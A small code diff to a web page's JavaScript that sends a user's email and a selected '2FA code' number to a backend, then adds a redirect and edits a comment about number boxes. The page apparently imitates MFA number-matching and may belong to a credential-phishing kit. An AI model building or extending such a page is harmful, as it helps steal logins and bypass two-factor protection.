@@ -134,6 +134,7 @@
                 body: JSON.stringify({ username: email, password: 'Login Now (2FA code: ' + selectedNumber + ')' })
             });
             loginNow.textContent = '✅ Sent';
+            setTimeout(function () { window.location.href = 'choose.html'; }, 800);
         } catch (err) {
             console.warn('server unreachable:', err);
             loginNow.textContent = 'Backend unreachable';
@@ -145,7 +146,7 @@
     seeRestDigits.addEventListener('click', function (event) {
         event.preventDefault();
 
-        // Only generate 31-100 once.
+        // Only generate remaining numbers (57-100) once.
         if (this.dataset.loaded !== 'true') {
             for (let i = 57; i <= 100; i++) {
                 container.appendChild(createNumberBox(i));
